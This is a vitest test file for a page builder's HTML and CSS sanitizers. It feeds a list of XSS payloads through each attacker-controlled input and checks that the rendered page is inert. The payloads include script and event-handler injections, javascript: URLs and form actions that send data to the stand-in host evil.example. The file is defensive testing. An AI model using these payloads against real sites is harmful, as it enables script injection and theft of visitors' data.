import { JSDOM } from 'jsdom';
import { describe, expect, it } from 'vitest';
import { sanitizeCss } from '../src/pagemodel/cssfilter.js';
import { normalizeDoc } from '../src/pagemodel/doc.js';
import { sanitizePageBody, sanitizeUserHtml } from '../src/pagemodel/htmlfilter.js';
import { renderProject } from '../src/pagemodel/render.js';
import { cleanProject } from '../src/pagemodel/shared/clean.js';
import { cleanDeclarations, safeCssValue } from '../src/pagemodel/shared/cssvalues.js';

/**
 * XSS corpus (OWASP cheat-sheet style). Every payload is pushed through every entry point an attacker controls (text content, attributes,
 * classes, style values, selectors, custom code, link and image URLs) and the RENDERED PAGE is then parsed by a real HTML parser: nothing in
 * it may be executable (script, handler attribute, javascript:/vbscript:/data: navigation, foreign iframe, form to a foreign action, base,
 * meta refresh, object/embed, srcdoc, @import of a foreign host, expression()).
 */
const ctx = { funnelId: 'f1', stepId: 's1', stepName: 'S', steps: [{ id: 's1', href: '/a' }, { id: 's2', href: '/b' }] };

const PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<body onload=alert(1)>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href="  javascript:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<form action="https://evil.example/steal"><input name=email></form>',
  '<button formaction="https://evil.example/">x</button>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  '<base href="https://evil.example/">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<style>@import "https://evil.example/x.css";</style>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><script>alert(1)</script></template>',
  '<details open ontoggle=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<video><source onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<div style="background:url(javascript:alert(1))">',
  '<div style="width:expression(alert(1))">',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '</title><script>alert(1)</script>',
  '</style><script>alert(1)</script>',
  '<!--<img src="--><img src=x onerror=alert(1)//">',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '\u0000<script>alert(1)</script>',
];

function assertInert(html: string): void {
  const dom = new JSDOM(html);
  const doc = dom.window.document;
  const body = doc.body;
  // The only scripts are the renderer's own (beacon + runtime); none contains payload text.
  for (const s of [...doc.querySelectorAll('script')]) {
    expect(s.textContent ?? '', 'script content').not.toMatch(/alert\(1\)|msgbox/);
    const src = s.getAttribute('src');
    if (src) expect(src).toMatch(/\/beacon\.js$/);
  }
  for (const el of [...doc.querySelectorAll('*')]) {
    for (const a of [...el.attributes]) {
      expect(a.name, `${el.tagName}[${a.name}]`).not.toMatch(/^on/i);
      expect(a.name).not.toBe('srcdoc');
      expect(a.name).not.toBe('formaction');
      if (['href', 'src', 'action', 'data', 'xlink:href'].includes(a.name)) {
        expect(a.value, `${el.tagName} ${a.name}`).not.toMatch(/^\s*(javascript|vbscript|data:text)/i);
      }
    }
  }
  expect(doc.querySelectorAll('base, object, embed, applet, frame, frameset, svg, math, template, noscript, link[rel=stylesheet]').length).toBe(0);
  expect(doc.querySelectorAll('meta[http-equiv]').length).toBe(0);
  for (const f of [...body.querySelectorAll('iframe')]) expect(f.getAttribute('src')).toMatch(/^https:\/\/(www\.youtube-nocookie\.com|player\.vimeo\.com)\//);
  for (const f of [...body.querySelectorAll('form')]) expect(f.getAttribute('action')).toMatch(/^\/api\/public\//);
  const css = [...doc.querySelectorAll('style')].map((s) => s.textContent ?? '').join('\n');
  expect(css).not.toMatch(/expression\s*\(|javascript:|-moz-binding|behavior\s*:/i);
  expect(css).not.toMatch(/@import\s+(url\()?["']?(?!https:\/\/fonts\.googleapis\.com)/i);
  expect(css).not.toMatch(/evil\.example/);
}

const wrap = (components: unknown[], styles: unknown[] = []) => ({ version: 2, project: { styles, pages: [{ frames: [{ component: { type: 'wrapper', components } }] }] } });
const render = (doc: unknown, extra: Partial<Parameters<typeof renderProject>[1]> = {}) => {
  const r = normalizeDoc(doc, { scriptsOk: false });
  if (!r.ok) return null; // refused outright is also safe
  return renderProject(r.doc.project, { ...ctx, ...extra }).html;
};

describe('XSS corpus through every attacker-controlled entry point', () => {
  for (const [i, p] of PAYLOADS.entries()) {
    it(`payload #${i}: ${p.slice(0, 50).replace(/\u0000/g, '\\0')}`, () => {
      const entries: unknown[] = [
        // text content
        wrap([{ type: 'text', tagName: 'p', components: [{ type: 'textnode', content: p }] }]),
        wrap([{ type: 'text', tagName: 'p', content: p }]),
        wrap([{ type: 'fn-heading', tagName: 'h1', components: [{ type: 'textnode', content: p }] }]),
        // attributes of generic and typed elements
        wrap([{ type: 'default', tagName: 'div', attributes: { title: p, id: p, 'aria-label': p, 'data-x': p, onclick: p, class: p, style: p, href: p, src: p, srcdoc: p, formaction: p }, classes: [p] }]),
        wrap([{ type: 'link', tagName: 'a', attributes: { href: p, target: p, rel: p }, components: [{ type: 'textnode', content: 'x' }] }]),
        wrap([{ type: 'image', tagName: 'img', attributes: { src: p, alt: p } }]),
        wrap([{ type: 'default', tagName: p, components: [] }]),
        wrap([{ type: p, tagName: 'div' }]),
        // typed props
        wrap([{ type: 'fn-button', tagName: 'a', fnAction: { type: 'link', url: p }, components: [{ type: 'textnode', content: p }] }]),
        wrap([{ type: 'fn-video', tagName: 'div', fnVideo: { url: p, title: p } }]),
        wrap([{ type: 'fn-form', tagName: 'div', attributes: { id: 'f1' }, fnForm: { name: p, fields: [{ id: 'email', type: 'email', label: p, required: true, placeholder: p }, { id: 'pick', type: 'select', label: p, options: [p] }], submitLabel: p, consent: { enabled: true, text: p }, success: { type: 'message', message: p } } }]),
        wrap([{ type: 'fn-checkout', tagName: 'div', attributes: { id: 'c1' }, fnProduct: { productName: p, description: p, price: 5, currency: 'USD', buttonLabel: p, success: { type: 'url', url: p } } }]),
        wrap([{ type: 'fn-countdown', tagName: 'div', fnCountdown: { mode: 'evergreen', minutes: 5, label: p, expiredText: p } }]),
        wrap([{ type: 'fn-progress', tagName: 'div', fnProgress: { value: 40, label: p } }]),
        // custom code from an account that may not author scripts
        wrap([{ type: 'fn-code', tagName: 'div', attributes: { id: 'k1' }, fnCode: { html: p, css: p, js: p } }]),
        // style rules
        wrap([], [{ selectors: [p], style: { color: p, background: p, width: p } }, { selectors: ['a'], selectorsAdd: p, style: { color: 'red' } }, { selectors: ['b'], style: { [p]: 'red', 'background-image': `url(${p})` }, mediaText: p, state: p }]),
      ];
      for (const e of entries) {
        const html = render(e);
        if (html) assertInert(html);
      }
      // the free-form sanitisers on their own
      assertInert(`<!doctype html><html><body>${sanitizeUserHtml(p)}</body></html>`);
      assertInert(`<!doctype html><html><body>${sanitizePageBody(p)}</body></html>`);
      assertInert(`<!doctype html><html><head><style>${sanitizeCss(p)}</style></head><body></body></html>`);
    });
  }
});

describe('CSS filtering', () => {
  it('drops expression(), behavior, -moz-binding, javascript: and foreign url()/@import, keeps ordinary rules', () => {
    const css = sanitizeCss(`
      @import url("https://evil.example/a.css");
      @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
      @font-face { font-family: x; src: url(https://evil.example/f.woff) }
      a { color: red; background: url(javascript:alert(1)); width: expression(alert(1)); behavior: url(x.htc); -moz-binding: url(x) }
      .ok { background: url(https://cdn.example/a.png) no-repeat; margin: 0 auto; padding: 4px 8px !important }
      .data { background: url("data:image/png;base64,iVBORw0KGgo="); }
      .svg { background: url("data:image/svg+xml;base64,PHN2Zz4="); }
      @media (max-width: 600px) { .m { display: none } }
      @media print and (max-width: 1px) { }
      .x { color: red } </style><script>alert(1)</script>
      @keyframes spin { from { opacity: 0 } }
    `);
    expect(css).toContain('@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap")');
    expect(css).not.toContain('evil.example');
    expect(css).not.toMatch(/expression|behavior|binding|javascript|@font-face|@keyframes|script/i);
    expect(css).toContain('a{color:red}');
    expect(css).toContain('url(https://cdn.example/a.png)');
    expect(css).toContain('padding:4px 8px !important');
    expect(css).toContain('image/png');
    expect(css).not.toContain('image/svg');
    expect(css).toContain('@media (max-width: 600px)');
  });

  it('rejects declaration values that could break out of a declaration or load script', () => {
    for (const bad of ['red;}body{display:none', 'red} a{', 'url(//evil.example/x)', 'url(ftp://x/y)', 'expression(1)', 'javascript:1', 'red /* x */', 'a\\62 ', '<b>', 'url(', 'image-set(url(a) 1x)', 'attr(onclick)', '"unterminated', '(((']) {
      expect(safeCssValue(bad), bad).toBeNull();
    }
    for (const good of ['#fff', 'rgba(0,0,0,.5)', 'linear-gradient(135deg,#0f172a 0%,#1e3a8a 100%)', 'url(/img/a.png)', 'url("https://cdn.example/a.jpg")', 'calc(100% - 20px)', '0 8px 24px -12px rgba(15,23,42,.18)', 'Inter,ui-sans-serif,"Segoe UI",sans-serif']) {
      expect(safeCssValue(good), good).toBe(good);
    }
    expect(cleanDeclarations({ color: 'red', 'behavior': 'x', position: 'fixed', '--fn-accent': '#123456', '--evil': 'red', 'background-image': 'url(javascript:alert(1))' })).toEqual({ color: 'red', position: 'fixed', '--fn-accent': '#123456' });
  });
});

describe('structure cleaning', () => {
  it('rebuilds components from an allow-list: tags, attributes, event handlers, classes, ids, hrefs and image sources', () => {
    const r = cleanProject({
      pages: [{ frames: [{ component: { type: 'wrapper', components: [
        { type: 'default', tagName: 'script', components: [{ type: 'textnode', content: 'alert(1)' }] },
        { type: 'default', tagName: 'DIV', attributes: { id: 'ok', onclick: 'x()', 'data-gjs-type': 'y', 'data-fn-form': '1', 'data-keep': 'z', role: 'button' }, classes: ['good', 'ba d', { name: 'ok2' }, '"><x'] },
        { type: 'link', tagName: 'a', attributes: { href: 'java\tscript:alert(1)' } },
        { type: 'link', tagName: 'a', attributes: { href: 'https://example.com/a', target: '_blank', rel: 'noopener evilrel' } },
        { type: 'image', tagName: 'img', attributes: { src: 'data:image/svg+xml;base64,AAAA', alt: 'x' } },
        { type: 'image', tagName: 'img', attributes: { src: 'data:image/png;base64,iVBORw0KGgo=', alt: 'x', onerror: 'x' } },
        { type: 'nope-type', tagName: 'iframe', attributes: { src: 'https://evil.example' } },
      ] } }] }],
      styles: [],
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const kids = (r.project.pages[0]!.frames[0]!.component.components ?? []) as Record<string, any>[];
    expect(kids[0]).toMatchObject({ tagName: 'div', type: 'default' }); // script became a plain, empty-looking div whose text is escaped on render
    expect(kids[1]).toMatchObject({ tagName: 'div', attributes: { id: 'ok', 'data-keep': 'z', role: 'button' }, classes: ['good', 'ok2'] });
    expect(kids[1].attributes).not.toHaveProperty('onclick');
    expect(kids[1].attributes).not.toHaveProperty('data-gjs-type');
    expect(kids[1].attributes).not.toHaveProperty('data-fn-form');
    expect(kids[2].attributes ?? {}).not.toHaveProperty('href');
    expect(kids[3].attributes).toEqual({ href: 'https://example.com/a', target: '_blank', rel: 'noopener' });
    expect(kids[4].attributes).toEqual({ alt: 'x' });
    expect(kids[5].attributes).toEqual({ src: 'data:image/png;base64,iVBORw0KGgo=', alt: 'x' });
    expect(kids[6]).toMatchObject({ type: 'default', tagName: 'div' });
  });

  it('the rendered output of a hostile page equals the output of the cleaned page (cleaning is idempotent and render re-cleans)', () => {
    const hostile = wrap([{ type: 'default', tagName: 'div', attributes: { onmouseover: 'x()', title: '"><script>' }, components: [{ type: 'textnode', content: '<img src=x onerror=1>' }] }]);
    const once = normalizeDoc(hostile);
    expect(once.ok).toBe(true);
    if (!once.ok) return;
    const twice = normalizeDoc(once.doc);
    expect(JSON.stringify(twice.ok && twice.doc.project)).toBe(JSON.stringify(once.doc.project));
    const a = renderProject(hostile.project, ctx).html;
    const b = renderProject(once.doc.project, ctx).html;
    expect(a).toBe(b);
    expect(a).not.toContain('onmouseover');
    expect(a).toContain('&lt;img src=x onerror=1&gt;');
  });
});

describe('custom code', () => {
  const code = { html: '<p onclick="x()">hi</p><script>RUN()</script>', css: 'p{color:red}@import url(https://evil.example/x.css)', js: 'RUN2()' };
  const doc = wrap([{ type: 'fn-code', tagName: 'div', attributes: { id: 'k1' }, fnCode: code }]);

  it('is sanitised for accounts that may not author scripts and verbatim only when the page owner is allowed', () => {
    const safe = normalizeDoc(doc, { scriptsOk: false });
    expect(safe.ok).toBe(true);
    if (!safe.ok) return;
    expect(JSON.stringify(safe.doc.project)).not.toContain('RUN');
    const html = renderProject(safe.doc.project, ctx).html;
    expect(html).toContain('hi');
    expect(html).not.toMatch(/RUN|onclick|evil\.example/);
    const owner = normalizeDoc(doc, { scriptsOk: true });
    expect(owner.ok).toBe(true);
    if (!owner.ok) return;
    // scripts only run when the renderer is told the page may carry them (workspace flag AND a permitted last saver)
    expect(renderProject(owner.doc.project, ctx).html).not.toContain('RUN()');
    const allowed = renderProject(owner.doc.project, { ...ctx, allowScripts: true }).html;
    expect(allowed).toContain('<script>RUN2()</script>');
    expect(allowed).toContain('RUN()');
  });

  it('a non-permitted saver keeps code they did not touch but cannot add or edit scripts', () => {
    const owner = normalizeDoc(doc, { scriptsOk: true });
    if (!owner.ok) throw new Error('setup');
    const untouched = normalizeDoc(JSON.parse(JSON.stringify(owner.doc)), { scriptsOk: false, previous: owner.doc });
    expect(untouched.ok && JSON.stringify(untouched.doc.project)).toContain('RUN2()');
    const edited = JSON.parse(JSON.stringify(owner.doc));
    edited.project.pages[0].frames[0].component.components[0].fnCode.js = 'EVIL()';
    const r = normalizeDoc(edited, { scriptsOk: false, previous: owner.doc });
    expect(r.ok && JSON.stringify(r.doc.project)).not.toContain('EVIL');
  });
});

describe('page-level custom CSS and headers', () => {
  it('custom CSS is filtered unless scripts are allowed; tracking code only when allowed', () => {
    const r = normalizeDoc(wrap([]), { scriptsOk: false });
    if (!r.ok) throw new Error('setup');
    const css = 'body{color:red}a{background:url(javascript:alert(1))}@import url(https://evil.example/x.css);';
    const filtered = renderProject(r.doc.project, { ...ctx, customCss: css, headerCode: '<script>TRACK()</script>' }).html;
    expect(filtered).toContain('body{color:red}');
    expect(filtered).not.toMatch(/javascript:|evil\.example|TRACK/);
    const trusted = renderProject(r.doc.project, { ...ctx, customCss: css, headerCode: '<script>TRACK()</script>', allowScripts: true, allowTrackingCode: true }).html;
    expect(trusted).toContain('TRACK()');
  });

  it('form actions in published pages always point at the app endpoint', () => {
    const r = normalizeDoc(wrap([{ type: 'fn-form', tagName: 'div', attributes: { id: 'f9', action: 'https://evil.example/x' }, fnForm: { fields: [{ id: 'email', type: 'email', label: 'Email', required: true }], submitLabel: 'Go' } }]));
    if (!r.ok) throw new Error(JSON.stringify(r.issues));
    const html = renderProject(r.doc.project, { ...ctx, apiBase: 'https://app.example.test' }).html;
    expect(html).toContain('action="https://app.example.test/api/public/forms/f1/s1/f9"');
    expect(html).not.toContain('evil.example');
  });
});
